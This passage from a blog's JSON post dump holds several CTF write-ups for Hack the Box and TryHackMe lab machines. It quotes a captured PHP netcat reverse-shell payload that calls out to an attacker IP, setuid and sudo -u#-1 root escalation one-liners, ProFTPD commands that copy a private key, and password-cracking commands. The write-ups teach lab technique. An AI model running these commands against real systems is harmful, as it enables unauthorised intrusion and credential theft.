https://gtfobins.github.io/gtfobins/less/#sudo &#8617; " }, { "title": "Previse (Hack the Box)", "url": "/posts/htb-previse/", "categories": "Cybersecurity, Writeups", "tags": "htb, ctf, writeup", "date": "2021-08-30 17:00:00 -0400", "snippet": "Previse is an Active machine on Hack the Box so this writeup will not be posted live to this website until a later date. Some information about the system: OS: Linux IP: 10.10.11.104EnumerationFi...", "content": "Previse is an Active machine on Hack the Box so this writeup will not be posted live to this website until a later date. Some information about the system: OS: Linux IP: 10.10.11.104EnumerationFirst things first, let’s start off with an nmap scan.The target is an Ubuntu OS as indicated in the service version information for SSH and HTTP services. These are also the only two ports that are open on the system. 22 (SSH) 80 (HTTP)HTTPInitially browsing to the web page, we are redirected to login.php. That saves us the trouble from enumerating the tech stack as the backend language is PHP.With no valid credentials leaked anywhere in the page source and no information obtained through robots.txt, let’s move on to directory enumeration to map out the application a bit more.Note: Some of the entries are duplicated since the common.txt file contains both /index and /index.php but tagging on the -x php extension evalues both as /index.php.Okay! So we have a few files to search through. I searched through all of the PHP files that did not redirect to login.php to determine if there was any interesting information. Most of them did not include much information but the nav.php file acted similar to a “sitemap”.I recalled from other THM or HTB experiences, you are able to view the source code of PHP pages. Checking out the source codeSome of the endpoints include: Creating an account Viewing the status of the website Checking out the log dataAt this point, I spent a significant amount of time combing through the PHP files but was not able to find anything.This is another mistake that I made and one I even mentioned in the writeup for Cap but I did not follow my own advice enough. Similar to Cap, I was collaborating on this box with my friends and one of them provided a minor hint on how they obtained access to the application by creating an account.A shot in the dark knowing that this would likely fail but I posted to the /accounts.php endpoint with a username and password payload hoping the application would error out with an informative payload.Looks like I was right and the application is yelling at me to provide the password confirmation. Looking closer at the response, the form is present with the exact fields required for the request. Looks like we got 2 out of 3 fields correct!Success! Looks like our account was added! Now we can authenticate to the application with the credentials kamikaze:test123.Another piece of helpful information that my friend stumbled upon during his enumeration of the application after I had already created the account was that we are able to view the HTML source prior to its redirection to /login.php. You can achieve this by intercepting the request in Burpsuite before it redirects or by using curl which does not redirect by default. I am not sure how I did not know about this earlier but definitely something to note. If I had known about this and viewed the HTML source of the PHP files, I would have been able to create the account with the knowledge that it was possible rather than taking a shot in the dark.I displayed the last 30 lines to include the form on the account creation page to demonstrate what my friend had learnt.LoginNow that we are logged in, we can browse some of the tabs available in the navigation bar which is probably what the output of the nav.php file was displaying.The Files section had one uploaded file for the backup of the site as a ZIP file.Within this backup, all of the PHP files existed including most of the files that we encountered in gobuster.Initial FootholdMost of the files did not stand out but the logs.php file had an interesting comment along with a piece of Python code that could lead to our initial foothold.The developer used a Python script to process the logs providing a delimiter as a command line argument to the script. The delimiter argument is provided as a parameter via a POST request (we’ll have to search for this) but since the parameter input is not escaped, we can abuse this for command injection leading to a reverse shell. The script is being executed as a system command so we can try to inject Bash commands to obtain a reverse shell.First, let’s search for where this POST request is being submitted in the application so we can abuse this.This endpoint was tucked away under the “Management Menu” heading in the navigation bar. Let’s capture this request in Burpsuite to see how the front-end submits the request and what the response looks like.Okay! Now, we have to verify that command injection is possible. One of the ways that I test this courtesy of IppSec on Youtube is to ping my attacker box and capturing the traffic filtering for ICMP packets.Fantastic! Looks like command injection is possible. Now, let’s try to use various payloads to generate a reverse shell.After a few attempts with a Bash TCP reverse shell, looks like the target had an OpenBSD version of netcat which allowed us to use the -e parameter. Last but not least, let’s upgrade this into a fully interactive TTY shell 1.One of the first things to check is the services listening as there may be some services listening locally.The netstat output indicates that there is a service listening on port 3306 which is typically the port for MySQL. The contents of config.php contained the credentials for the MySQL database.&lt;?phpfunction connectDB(){ $host = 'localhost'; $user = 'root'; $passwd = 'mySQL_p@ssw0rd!:)'; $db = 'previse'; $mycon = new mysqli($host, $user, $passwd, $db); return $mycon;}?&gt;Connecting to the previse database within the MySQL server, there are two tables, accounts and files. Let’s dump the accounts database to see if there are other accounts than the kamikaze user we created that may provide us user access to the system.Looks like the m4lwhere user has a hash with a salt that does not appear to be ASCII. This is an md5crypt hash that is frequently used in PHP to hash passwords.This took several attempts until I had to ask my friend how they cracked the password. I initially tried to copy the non-ASCII character in the salt from the accounts.php file but this produced no luck as both JTR and Hashcat complained about invalid token length. Next, I modified the encoding displayed in my terminal to ISO-8859-1 and JTR did not complain anymore but it did not crack the password with rockyou.txt.After some advice by my friend to approach it the same way but to use md5crypt-long, the password was cracked after several minutes.Success! We finally obtained some credentials m4lwhere:ilovecody112235!.The first thing we should try is to switch into m4lwhere from www-data.And we are in! Once we grabbed the user flag, it is time to perform some privilege escalation.Privilege EscalationLet’s check out m4lwhere’s sudo privileges.It appears that m4lwhere is able to execute the script at /opt/scripts/access_backup.sh as root if a password is provided. Dumping the contents of the bash script, the script is intended to be run as a cron job to backup the site at a regular interval.However, the date binary used within the two lines is not an absolute path to the date binary which means that we can abuse this using PATH variable manipulation.The first thing to do is the prepend the PATH where the manipulated date file will be located. Second, create a binary with the contents of /bin/bash -p which will place you in a bash session with the privileges of the user that executed it. Next, run the access_backup.sh script to trigger the manipulated file to escalate your privileges and ta-da!We have obtained root privileges and can move onto grabbing the root flag completing this box.Useful CommandsViewing PHP Source CodeUse curl to view the source code of a PHP file even if the page redirects to login.php. IF gobuster indicates there is a response size despite redirection, you will be able to view the source code.Steps to Path Variable Manipulation PrivEsc Prepend the PATH with the location of the manipulated binary. Generate the binary with a reverse shell payload or bash shell escalation. Call the script allowing this privesc technique.ReflectionI generally find Hack The Box boxes that are rated easy more difficult than the Try Hack Me boxes. This was no exception. There were a few circumstances where I turned to the help of my friends for some advice and I even learned a few things along the way.There’s no harm in asking for advice but looking back, I did not put enough effort in enumerating the application as I should have. I tend to try to move quickly through my enumeration and analysis techniques and I miss critical information. An example of this is noting that the nav.php file contained a “Create Account” comment but I didn’t explore this further. Another example is when JTR suggested using md5crypt-long and I didn’t want long enough for the program to finish trying to crack the password.Once again, this box was designed well and used a lot of techniques that I have learned about through THM and other sources. Although I required a bit of help, I can very well see the results of my efforts from learning about cybersecurity and ethical hacking.References https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ &#8617; " }, { "title": "Cap (Hack the Box)", "url": "/posts/htb-cap/", "categories": "Cybersecurity, Writeups", "tags": "htb, ctf, writeup", "date": "2021-08-30 17:00:00 -0400", "snippet": "Cap is an Active machine on Hack the Box so this writeup will not be posted live to this website until a later date. Some information about the system: OS: Linux IP: 10.10.10.245EnumerationFirst ...", "content": "Cap is an Active machine on Hack the Box so this writeup will not be posted live to this website until a later date. Some information about the system: OS: Linux IP: 10.10.10.245EnumerationFirst things first, let’s start off with an nmap scan.I shortened some of the nmap output ignoring the remaining output for the HTTP service as well as the OS fingerprinting.The target is an Ubuntu OS as indicated by the service version information for the SSH service. Other interesting things of note is that the server hosting the web service on port 80 is a Gunicorn server which means the likelihood of the back-end language being Python is high.There are 3 open ports: 21 (FTP) 22 (SSH) 80 (HTTP)Let’s enumerate some of these services a bit more.HTTPWhen we first browse to the landing page, we come across a security dashboard providing statistics on a few security events.If we expand the left-hand side “hamburger” menu and the drop down under Nathan, we are presented with several hyperlinks.The links under the Nathan drop down were empty hyperlinks that did not lead anywhere. However, each of the tabs on the “hamburger” menu provided useful information about the system.IpconfigThe title IP Config pretty well explains its purpose displaying the interface configuration of the system.This target is not dual-homed and it contains a single interface that we are accessing so there is not much to look at here.NetstatThe Netstat section is also just as clear on its purpose.There is a significant amount of output here as well but there was not much of interest. I also don’t have much experience reading netstat output unless it is the standard netstat -tulnp command.Security SnapshotHovering over the Security Snapshot tab, we notice that the application is pointing us the /capture endpoint. Once I clicked on this tab, the application hung for a few seconds before displaying a summary of packet information.In this situation, there is not much useful information presented as there are no packets. If I download the file, it saves to the filesystem as 3.pcap with no packets captured. That probably explains the 0 values presented to us for each field in the Dashboard.However, if we notice the url, the application redirected to us to /data/3. The application is probably capturing packets and saving them as numerical ID’s and subsequently available to download as &lt;id&gt;.pcap. So, what if we modify the ID value to access other packet captures. The packet captures with ID 1 and 2 did not contain any packets either but the packet capture with ID 0 had plenty.The file, 0.pcap, captured communication between nathan and several of the services available on the target. One of the series of packets captured nathan’s authentication to the FTP server in cleartext.Fantastic! We have a potential entry point into the system!FTP Credentials: nathan:Buck3tH4TF0RM3!Let’s try out these creds.FTPGreat! The credentials were in fact valid and dropped us into nathan’s home directory.At this point, I spent a significant amount of time searching through the file system for potential SSH private/public keys, and the application source code.Maybe we are able to drop a reverse shell written in Python into the /var/www/html directory that Gunicorn is serving the application from. No luck there!Checking out the application source code, I saw the app.py file that contained all of the endpoints written in Flask (Python web micro-framework) and one of the functions stood out to me.There weren’t many conclusions I could draw from this so I quickly moved on but I will address this more in the Reflection section.At this point, I had nothing to go off of. I was still trying to assess other vectors to gain access through the FTP server. At the same time, I was working on this box with my friend. He had already gained access so I asked him what his vector was and he told me SSH. And then it hit me like a ton of bricks; the creds for the FTP server were the same as the SSH service.SSHSMH. But yay!Initial FootholdNow that we have our initial foothold, let’s grab the user.txt flag.Privilege EscalationSince I was working on the box with my friend, he had already ran through the Linpeas (privilege escalation enumeration) script, and we combed through any potential vectors.One of the ones that he noticed was that Python had the cap_setuid capability set. Interestingly enough, I had encountered the same privesc vector with Perl on a TryHackMe box.With Python having the cap_setuid capability set, we are able to abuse this courtesy of a command from GTFObins 1.Now, we can use this command to escalate our privileges and get the root flag!And, we have completed this box.Useful CommandsFind all files with capabilities setgetcap -r / 2&gt;/dev/nullPrivilege Escalation with Python CapabilityIf the Python binary has the cap_setuid capability set, usepython3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'to escalate your privileges.ReflectionAfter reflecting on this box, I noticed a few things that would have made the privilege escalation technique a bit more obvious.The Security Snapshot tab was capturing the traffic for 5 seconds and generating a packet cpature file. However, capturing traffic is a root privilege which the application was performing. Unless the application was running as root, this isn’t possible without providing some root privileges to the application.The code comments in the /capture endpoint of the image that I posted earlier highlights this fact since nathan applied a hacky trick with the setuid(0) capability in order to capture the traffic.This further highlights one of my weaknesses which is building a mental landscape of an application’s functionality. This is a vital step once you have fully enumerated an application and something to focus on in the future.Overall, a very enjoyable room on HackTheBox and definitely one of the easier ones that I would recommend.References https://gtfobins.github.io/gtfobins/python/#capabilities &#8617; " }, { "title": "Overpass 2 - Hacked (Try Hack Me)", "url": "/posts/thm-overpass-2/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup", "date": "2021-08-29 13:25:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.ForensicsThe first few tasks in this room revolve around analysis of a PCAP file. This PCAP file contains a network traffic capture as to how the attacker entered the room and left a backdoor.Reverse ShellThe first few packets contain some normal HTTP traffic to a web server including a GET request to /development.The next TCP stream contains a POST request to /development with an upload.php file that looks like a reverse shell payload.The payload is &lt;?php exec(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f\")?&gt;This payload contains the IP address and port of the listening host for the reverse shell. If we apply a display filter to the PCAP of tcp.port == 4242, we can quickly find the communication between the attacker’s reverse shell and the system.I’ve shortened the output as the stream is fairly long but this stream contains the password for the user james, an output of the /etc/shadow file, and a backdoor that the attacker left behind.Password CrackingWe already have the password for the user james, whatevernoteartinstant but this password did not work for the SSH service on port 22. However, we have not yet enumerated the target machine so maybe that SSH service is not even listening? We shall check that out after once we finish analyzing this PCAP file.Let’s try to crack these passwords that we found in the packet capture.So 4 of the 5 passwords were crackable!bee: secret12szymex: abcd123muirland: 1qaz2wsxparadox: secuirty3BackdoorNow, let’s check out the backdoor!Going to the GitHub repository that maintains the backdoor, there are a few pieces of information that we can use to our advantage.In the file main.go, the salt is present along with the default hash. However, the attacker used his own hash that is present in the packet capture file. Together, we might be able to find the password associated with that hash!Hash: 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bedSalt: 1c362db832f3f864c8c2fe05f2002a05Saving the above info in the format hash:salt and using hashcat, we found the password to be november16.Initial FootholdFrom information in the packet capture, the backdoor SSH service is listening on port 2222 under the user james and we can provide the password that we cracked using hashcat.ssh james@10.10.125.145 -p 2222Success! We got access to the system as james. It looks like that the original password that james had whatevernoteartinstant does not work as the attacker may have modified it.Navigating to james’ home directory, the user.txt flag is present.Privilege EscalationIt also looks like the attacker left a hidden backdoor file that would escalate his privileges to root.This file looks like it is just the bash binary but with the SUID bit enabled. Performing a diff on this file with the /bin/bash default binary shows that they are the exact same.Therefore, we should be able to escalate our privileges by executing the SUID binary with the -p flag.Useful CommandsCracking $6$ Linux Shadow Hasheshashcat -m 1800 -a 0 -o found.txt passwords.txt /usr/share/setoolkit/src/fasttrack/wordlist.txtCracking SHA512 with Salt and Hashhashcat -m 1710 -a 0 crackme.txt /usr/share/wordlists/rockyou.txtFor the above mode, save the crackme.txt file as hash:salt.ReflectionThis room is definitely one of my favorite so far because of how unique it is. The first half is focused on forensic analysis of a PCAP file and exploiting the same backdoor that a hacker has left.In this room, I learned about: PCAP analysis Cracking SHA512 (Unix + normal?) hashes with salts using Hashcat and John the Ripper Reading GO source codeThis is definitely a fantastic room to improve your Wireshark and password cracking skills as well as your ability to piece together information to understand the full picture of the exploitation path." }, { "title": "Pickle Rick (Try Hack Me)", "url": "/posts/thm-pickle-rick/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup, web application, gobuster, python, reverse shell, webshell, privesc", "date": "2021-08-28 13:20:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.Note: The target IP address may change throughout the writeup as I complete the room over a period of time.ScenarioTitle: Pickle RickLink: https://tryhackme.com/room/picklerickDescription: A Rick and Morty CTF. Help turn Rick back into a human!Free/Subsciber: FreeDifficulty: EasyEnumerationFirst things first, let’s start off with an nmap scan.The target is an Ubuntu OS identified by the information in the service version for SSH and HTTP. There are two ports open: 22 (SSH) 80 (HTTP)SSHNothing much to see here without any potential credentials and no information leaked in the banner.HTTPBrowsing to the web server, there is a plead by Rick for Morty to help him out as he forgot the password and he needs to locate the last three ingredients to finish his reversing potion.A username is leaked in the page source! R1ckRul3sThe last thing to check before we move onto further enumeration is a presence of the robots.txt file. There is one present but it does not contain any disallow entries except for a string that seems like it could be a password or hint that is used later on.WubbalubbadubdubSo far, we have a found potential username and password combination:R1ckRul3s:WubbalubbadubdubTrying to authenticate ourselves through SSH did not pan out. Let’s continue on with some directory enumeration as we cannot progress from what is available to us through the landing page.An interesting result shows up in the Gobuster results, login.php. Maybe our credentials will work there!The creds authenticate us successfully! We’re redirected to a portal.php Command Panel page.Initial FootholdReverse ShellAfter executing a few commands to identify the type of webshell such as ls, whoami, it is clear that this is a Bash webshell.To gain access to the system through the command line, let’s try to generate a reverse shell!After creating a netcat listener on port 1234, I tried a few payloads from the PayloadAllTheThings repository for the reverse shell. Ultimately, a python3 reverse shell worked for me in the end 1.We have to stabilise our reverse shell by upgrading it into a fully interactive tty shell 2. Once that’s done, we can look around the file system as the www-data user.Checking out the files in the /var/www/html directory where the web server files are served from, we come across the first ingredient.Sup3rS3cretPickl3Ingred.txtmr. meeseek hairNext is to check out the files in the home directory of the rick user and we found the second ingredient!second ingredients1 jerry tearPrivilege EscalationThe third and last file is most likely in the home directory of the root user as I could not find it from the current privileges.Checking out the privileges of the www-data user, this user is able to execute all commands as root with no password required.I escalated the privileges of this user through the command sudo su.And the third and final ingredient to turn Rick back into a human is found! 3rd.txt3rd ingredients: fleeb juiceReflectionRick and Morty is one of my favorite animated shows so it was pretty enjoyable to do a CTF kind of focused on that.This is also my 3rd time completing this room so I’ve pretty confidently figured out the necessary path to find all the ingredients and become root.The very first time when I was very, very new to all of this, I completed this room through the webshell only. This room is enjoyable and provide many of the standard CTF/THM tactics needed to complete it!Killchain Summary View the source code of index.html of the web application to locate the username for Rick. Identify a potential password for Rick in robots.txt. Perform directory enumeration to locate the Command Panel endpoint and authenticate. Initialize netcat to capture a reverse shell connection with a Python payload. Escalate privileges from www-data to root as www-data has full root privileges.lMisconfigurations Sensitive information leaks in the source code and robots.txt. www-data should not have full root privileges. The command panel should have improved the command filtering to not allow execution of commands that could provide shell access. Instead of using a blacklist of commands, there may have been better results with a whitelist of commands and filtering further commands. Lock down the host-based firewall to not allow outgoing connections for the reverse shell.Things I Learned Generating a reverse shell connection with Python.References https://github.com/swisskyrepo/PayloadsAllTheThings &#8617; https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ &#8617; " }, { "title": "Agent Sudo (Try Hack Me)", "url": "/posts/thm-agent-sudo/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup, burpsuite, user-agents, web application, ftp, brute force, python, steganography, steghide, base64, 7z2john, jtr, password cracking", "date": "2021-08-26 19:00:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.Note: The target IP address may change throughout the writeup as I complete the room over a period of time.ScenarioTitle: Agent SudoLink: https://tryhackme.com/room/agentsudoctfDescription: You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.Free/Subsciber: FreeDifficulty: EasyEnumerationFirst things first, let’s start off with an nmap scan.The target is an Ubuntu OS from information gained in the service version information for SSH and the Apache web server.There are three open ports: 21 (FTP) 22 (SSH) 80 (HTTP)FTPThe FTP service does not allow anonymous authentication so we may not be able to do much unless we have potential usernames and passwords.SSHNo banner to grab so let’s move on to the HTTP service.HTTPThe landing page contains a clue on how we are able to access the site. The user-agent string might be some letter from the alphabet potentially including the word agent.Burpsuite IntruderLet’s generate a list and use Burpsuite’s Intruder feature to see if any of the user-agent strings provide access to the website!import stringwith open(\"useragents.txt\", \"w\") as f: for letter in string.ascii_uppercase: f.write(letter + \"\\n\") f.write(\"Agent \" + letter + \"\\n\")The above code generated a list of the format:AAgent ABAgent B......With the payload position set for the user-agent in the Intruder attack, we’ll load the generated list as potential payloads and launch the attack.With the attack results, the payload with value “C” has a differing payload length size compared to the rest of the requests.Right click on the request that stands out, scroll down to “Show response in browser”, copy the URL, and open it in the browser. Burp will execute the exact request so you don’t have to manually modify the request yourself.There’s a few pieces of interesting information on the landing page: There is a third agent, J Agent C’s name is chris chris has a weak passwordFTP with CredentialsAttempting to brute force both the SSH service and FTP service, Hydra returned a password for Chris on the FTP service with a password of crystal.FTP credentials: chris:crystalThere are two image files and a text file. The contents of the text file To_agentJ.txt:Dear agent J,All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.From,Agent CSo there is hidden data within the other two images that we might have to extract.Initial FootholdSteganographyFor the first image, cutie.png, let’s use the stegextract tool since it’s a PNG file. The usual tool that I use, steghide, doesn’t support PNG files.So we found a ZIP file that can only be extracted using the 7z command. However, the zip file requires a password. Fortunately, we can brute force this using John the Ripper by converting the zip file into a hash through the zip2john tool.Success! The password for the zip file is alien. Within the zip file, there is a text file, To_agentR.txt, with the contentAgent C,We need to send the picture to 'QXJlYTUx' as soon as possible!By,Agent RThat string looks like it is base64 encoded.$ echo QXJlYTUx | base64 -dArea51Great! Let’s move onto the second image, cutie-alien.jpg.Since this is a JPEG image, we can use the steghide series of tools to determine if there is embedded data or not.The steghide tool prompted us for a password. Instinctively trying out Area51 as the password, the tool informed us that there is a message.txt file hidden in the image! Let’s extract it usingsteghide extract -sf cute-alien.jpgThe contents of message.txt isHi james,Glad you find this message. Your login password is hackerrules!Don't ask me why the password look cheesy, ask agent R who set this password for you.Your buddy,chrisLooks like we are able to log into the server using the credentials james:hackerrules!.Once authenticated to the SSH server, we find the flag in the home directory for james as user_flag.txtUser Flag: b03d975e8c92a7c04146cfa7a5a313c7Privilege EscalationLet’s check the sudo privileges of james.The version of this sudo program is 1.8.21p2 which is susceptible to a vulnerability. The vulnerability focuses on the configuration of the user’s sudo privileges (ALL, !root) where the sudo program doesn’t check for the existence of thespecified user id and executes the non-existing id as sudo 1.The command sudo -u#-1 /bin/bash will escalate you to the root privileges.Success! And the root flag was available at /root/root.txt.Root Flag: b53a02f55b57d4439e3341834d70c062ReflectionThis room was heavily focused on a CTF style which is fine but also took a while to kind of understand how to proceed through the different stages.However, I learned a lot about extracting data hidden in PNG and JPEG images, brute forcing SSH and FTP services, and a privilege escalation vector that is focused on binaries that are not updated!Killchain Summary Retrieve Agent R’s note for Chris by brute forcing the user-agents on the web application. Brute force the FTP service for the username chris knowing that he has a weak password. Extract trailing ZIP file hidden in the PNG file. Use zip2john and JTR with rockyou.txt to crack the password for the ZIP file. Base64 decode the codeword in the ZIP file. Use the decoded codeword as the password to the embedded data in the JPG file. Authenticate to the SSH service with the credentials found in the embedded data. Escalate privileges using sudo -u#-1 /bin/bashMisconfigurations The codenames for the Agents should be more obscure than just the letters of the alphabet. Password policies should not allow weak or common words as passwords. Embedded data within images is not a secure method for transmitting information. System should be updated to remove the sudo privilege escalation vulnerability.Summary of ExploitsPrivilege EscalationSpecifically related to CVE-2019-14287, if the user’s privileges are configured with (ALL, !root) /bin/bash and the SUDO version is prior to 1.8.28, privileges can be escalated by:sudo -u#-1 /bin/bashThis allows users with sudo privileges to run commands as root even if the specification states that you can run as ALL users except root so long as the ALL keyword is specified 1.Things I LearnedSteganographyExtract trailing data from a PNG file.stegextract cutie.pngBruteforce password cracking for a JPG file.stegseek cutie-alien.jpg /usr/share/wordlists/rockyou.txtZip CrackingTo use John the Ripper to crack a zip file, we first need to convert it to something that John the Ripper can understand.zip2john cutie.zip &gt; cutie.hashjohn --wordlist=/usr/share/wordlists/rockyou.txt cutie.hashReferences https://www.exploit-db.com/exploits/47502 &#8617; &#8617;2 " }, { "title": "Kenobi (Try Hack Me)", "url": "/posts/thm-kenobi/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup", "date": "2021-08-25 17:45:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.EnumerationLet’s start off with the nmap scan.The target is an Ubuntu OS as noted in the Apache and SSH version information. The following ports are open: 21 (FTP) 22 (SSH) 80 (HTTP) 111 (RPC) 139/445 (SMB) 2049 (NFS)HTTPChecking out the landing page, it’s just an image of two Star Wars characters fighting. There’s no information leaked in the page source and the entry in robots.txt leads to a gif of another Star Wars character commenting that “IT’S A TRAP!!”.As a hail mary, directory enumeration also returned no results. This service is probably a rabbit hole so let’s move on to the next service.SMBUsing smbclient, we are able to list the shares that the SMB service is serving.There’s a single non-default share that we might be able to access, anonymous.Within the share, there is a single file, log.txt, that contains information about the configured FTP, SMB, NFS, and SSH services.There’s several pieces of interesting information in this log file but one of the things that sticks out is that the kenobi user owns the FTP service and that kenobi has generated an SSH key pair for authenticating to the target.NFSThere is an NFS service running at port 2049. We could use the nfs-* scripts through nmap or we could use the showmount command to list out the shares on the server.Using the mount command, we are able to mount the share to our local filesystem and note that it is mapped to the /var directory on the remote server.There are not many interesting files and we are not able to write any files as the share is read-only.FTPUsing the ftp client, anonymous authentication requires a password.At this stage, it was slightly challenging and had to look at the walkthrough. Two things were of note. One is that the proftpd version is vulnerable and the second is that you can use netcat to send raw commands to the FTP service. I am still confused on why you are not required to authenticate when establishing a session with netcat or telnet but you are required with ftp client.The proftpd version 1.3.5 is vulnerable to read and writing arbitrary files using the site cpfr and cpto commands 1. At this point, one of the potential ways we can obtain access to the system is to copy the kenobi user’s ssh private key located at /home/kenobi/.ssh/id_rsa to the /var/tmp directory. This directory is world writeable so the kenobi user should be able to copy the file there.Initial FootholdEstablishing a connection to the FTP server using netcat and we successfully copy the file over to the /var/tmp directory in the NFS share.Copying this file over to our local filesystem from the NFS share, and modifying the permissions of the private key to 600, we can successfully authenticate to the system as the kenobi user.User Flag: d0b0f3f53b6caa532a83915e19224899Privilege EscalationLet’s check out the binaries that have the SUID bit set!One of these binaries stands out from the others! The binary /usr/bin/menu does not seem like a standard binary. Looking into it further, it is owned by the root user and provides a text based interface to execute different commands. curl uname ifconfigDumping the ASCII strings of the binary by strings /usr/bin/menu, our assumption is validated as we see the three commands.However, these commands are not absolute paths! That means we can manipulate the PATH to create our own binary of one of those commands and escalate our privileges.The image combines multiple steps so I will break it down! We exported the path variable to include /tmp at the beginning of the path. The next time we run a command, the first path that the system will look for a binary will be in /tmp. Next, we created the binary ifconfig with the content /bin/bash -p which will run the bash interpreter with the privileges of the user that ran the command which is root in this case. Run the misconfigured SUID binary as usual selecting the option that triggers the user created binary which is option 3 in this case.And there we go! We obtained a root shell along with the root flag.Root Flag: 177b3cd8562289f37382721c28381f02Useful CommandsService version enumerationRemember to always check versions of services to see if they are susceptible to any publicly disclosed vulnerabilities.In this case, the proftpd version 1.3.5 is vulnerable to read and write arbitrary files even if you are unauthenticated.Raw FTP commandsYou are able to send raw commands through netcat and telnet as it does not ask you to authenticate when not using the ftp client.$ nc 10.10.123.62 21site cpfr /home/kenobi/.ssh/id_rsasite cpto /var/tmp/id_rsaNFS sharesshowmount -e 10.10.123.62sudo mount -t nfs 10.10.123.62:/var nfs -o nolockReflectionI felt that this room was challenging and far more realistic than other Easy rooms I have encountered on Try Hack Me. There were services that were rabbit holes, services that were not updated and had exploits available for that version, misconfigured binaries, and an initial foothold vector that relied on multiple services working in combination. Overall, very enjoyable!Some lessons for the future. Fully enumerate a service along with any public exploits for that version Use other methods of connecting to a service such as netcat or telnet especially if they are plain text protocols Understand the configuration of services, the users running the service, and permissions if the information is availableReferences https://www.exploit-db.com/exploits/49908 &#8617; " }, { "title": "Bounty Hacker (Try Hack Me)", "url": "/posts/thm-bounty-hacker/", "categories": "Cybersecurity, Writeups", "tags": "thm, ctf, writeup, ftp, ssh, privesc, tar, hydra, brute force", "date": "2021-08-25 10:55:00 -0400", "snippet": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely commun...", "content": "I am currently in the process of completing these boxes on Try Hack Me again in an effort to document my experience, reinforce my knowledge of the topics, and improve my ability to concisely communicate the pentest lifecycle.Note: The target IP address may change throughout the writeup as I complete the room over a period of time.ScenarioTitle: Bounty HackerLink: https://tryhackme.com/room/cowboyhackerDescription: You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!Free/Subsciber: FreeDifficulty: EasyEnumerationFirst things first as always, start off with an nmap scan to enumerate the services on the target.From the version information for the SSH and Apache services in the nmap scan results, the target is an Ubuntu OS. There are a total of three open ports from our scan of the top 1000 ports: 21 (FTP) 22 (SSH) 80 (HTTP)FTPThe ftp-anon NSE script indicates that anonymous FTP login is enabled.. Connecting to the server and listing the files shows there’s two files present: task.txt lock.txt1.) Protect Vicious.2.) Plan for Red Eye pickup on the moon.-linrEddrAGONReDdr4g0nSynd!cat3Dr@gOn$yn9icat3R3DDr46ONSYndIC@TeReddRA60NR3dDrag0nSynd1c4tedRa6oN5YNDiCATEReDDR4g0n5ynDIc4teR3Dr4gOn2044RedDr4gonSynd1cat3R3dDRaG0Nsynd1c@T3Synd1c4teDr@g0nreddRAg0NREddRaG0N5yNdIc47eDra6oN$yndIC@t34L1mi6H71StHeB357rEDdragOn$ynd1c473DrAgoN5ynD1cATEReDdrag0n$ynd1cateDr@gOn$yND1C4TeRedDr@gonSyn9ic47eREd$yNdIc47edr@goN5YNd1c@73rEDdrAGOnSyNDiCat3r3ddr@g0NReDSynd1ca7eThe first file, task.txt, contains two tasks which may be important but doesn’t provide much information other than the fact that it was written by lin which could be a potential username for further FTP or SSH access.The second file, lock.txt, may be a password list which could be used in combination with the username, lin, to brute force those services.HTTPLet’s first check out the HTTP site. The initial page contains some various quotes from Cowboy Bebop, an anime.There’s no information leaked in the source code, no robots.txt file, and no results in the directory enumeration scan.Let’s approach the SSH service with the data that we found from the FTP server.Initial FootholdHydraAs an initial check, no information was leaked in the banner when trying to connect. With the potential username, lin, and the password file, let’s use Hydra to brute force the SSH service.Success! We can conncet to the target machine through the SSH service with the credentials lin:RedDr4gonSynd1cat3.In the users home directory, the user.txt flag is available for us!User Flag: THM{CR1M3_SyNd1C4T3}Privilege EscalationChecking for the sudo privileges of lin since we have his password, he is able to run the /bin/tar binary as root.Fortunately, gtfobins has an incredibly simple example of abusing this to attain a privileged shell 1.There we go! We have successfully attained a root shell. The above command is attempting to create a tar archive into /dev/null with content from /dev/null and at every checkpoint (1 file), it executes the /bin/bash binary as root which is how we escalated our privileges.Last step is just find the root flag /root.Root Flag: THM{80UN7Y_h4cK3r}ReflectionThis room was not as difficult as some of the other Easy rated rooms that I have come across on THM but it was a good opportunity to try other vectors instead of getting stuck on one.The HTTP server had nothing to do with the killchain for this target but it commonly is in these CTF style rooms.Lastly, the manipulation of the tar command is an interesting method to escalate your privileges.Killchain Summary Authenticate anonymously to the FTP server to find a password list and a potential username. Brute-force the SSH server with the username and password list to obtain an initial foothold. Escalate privileges through the tar binary which lin is allowed to execute as root.Misconfigurations Anonymous authentication should not have been enabled for the FTP service. Sensitive information was leaked on the FTP server. To prevent 